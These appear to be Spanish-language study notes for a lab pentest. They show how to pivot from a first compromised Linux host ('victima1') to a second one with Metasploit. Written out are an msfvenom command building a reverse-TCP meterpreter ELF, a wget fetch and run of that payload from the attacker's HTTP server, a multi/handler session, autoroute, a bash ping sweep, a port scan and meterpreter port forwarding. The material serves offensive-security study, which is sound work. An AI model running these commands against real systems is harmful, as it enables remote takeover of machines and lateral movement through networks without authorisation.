attack ---> victima1(linux) ---> victima2(linux)

una vez tengamos una reverse shell de victima1, podemos mandarlo como sesion de meterpreter creando un payload
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=ip_attack LPORT=puerto -f elf -b '\x00\x0a\x0d' -o payload`

-----------------------------------------
elf: ELF significa **Executable and Linkable Format**. Es el formato de archivo ejecutable estándar en sistemas operativos basados en **Linux y Unix**.

### **Hexadecimal en `-b '\x00\x0a\x0d'`**

- **Significado**: `-b` se usa para **especificar "bad characters"** o caracteres que no deben aparecer en el payload generado.
- **Bad characters**: Son bytes que, si están presentes en el payload, podrían causar errores, truncar la ejecución o invalidar la carga útil. Estos suelen depender de la aplicación, protocolo o sistema que se está atacando.

#### **Bad characters en este caso:**

- **`\x00`**: Es el byte nulo (NULL), que generalmente marca el final de una cadena en C. Si aparece en el payload, el sistema podría interpretarlo como el final y truncar la ejecución.
- **`\x0a`**: Es el carácter de **salto de línea (newline)**, que en algunos contextos se interpreta como el final de un comando o entrada.
- **`\x0d`**: Es el carácter de **retorno de carro (carriage return)**, que puede interferir en ciertas comunicaciones.

Al usar `-b '\x00\x0a\x0d'`, estás diciendo a **msfvenom**: _"Genera un payload que evite estos caracteres"_.
esto es porque cada sistema interpreta distinto el hexadecimal, puede terminar linea, salto de linea, retorno de carro, etc.

---------------------------------------

en la maquina attack creas un servicio http para compartir el archivo `python3 -m http.server 80`

y en la victima1 `wget ip_attack/archivo`

en la maquina attack abres `msfconsole -> use exploit/multi/handler`
configuramos el mismo payload, etc.

atacante `run` y ejecutamos en victima1 `chmod +x archivo && ./archivo`

DATO:
***antes del pivoting, se debe escalar privilegios***

***independiente de metasploit, victima1 debe ser root para hacer el multihandler.***

obtenido el meterpreter:
`background`

`use /multi/manage/autoroute` enrutar el trafico
`route` muestra las interfaces conectadas

---------------------------------------
identificar maquina:
de preferencia hacer un script en bash y en lado de victima1 descargarlo para descubrir maquinas
```
#! /bin/bash

for i in {1..255}; do
	timeout 1 bash -c "ping -c 1 10.10.10.$i" > /dev/null
	if [ $? -eq 0 ]; then
		echo "activo 10.10.10.$i"
	fi
done
```
identificado a la nueva maquina se procede con el escaneo de puertos

------------------------------------------------------------------------
`use scanner/portscan/tcp`
se pone la ip de victima2 de su interfaz de red
identificado los puertos entra el PORTFORWARDING

-------------------------------------------------
volvemos a la sesion de meterpreter
`meterpreter > portfwd add -l mipuerto -p puertovictima -r ipvictima`

todo se trae al localhost, `127.0.0.1` 




